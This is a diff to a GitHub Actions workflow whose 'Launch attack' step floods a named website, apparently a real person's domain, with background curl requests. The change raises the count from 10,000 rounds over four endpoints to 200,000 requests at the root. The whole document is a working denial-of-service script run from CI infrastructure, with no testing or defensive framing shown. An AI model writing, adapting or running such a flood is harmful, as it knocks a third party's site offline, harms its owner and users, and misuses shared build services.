@@ -14,12 +14,9 @@ jobs:
 
       - name: Launch attack
         run: |
-          echo "🚀 Starting heavy attack on https://mohamed-shaheen.axnos.com/"
-          for i in {1..10000}; do
-            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/home" || true &
-            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/login" || true &
-            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/search?q=test" || true &
-            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/api/v1/" || true &
+          echo "🚀 Starting attack on https://mohamed-shaheen.axnos.com"
+          for i in {1..200000}; do
+            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com" || true &
           done
           wait
-          echo "✅ Heavy attack wave completed."
+          echo "✅ Attack wave completed."
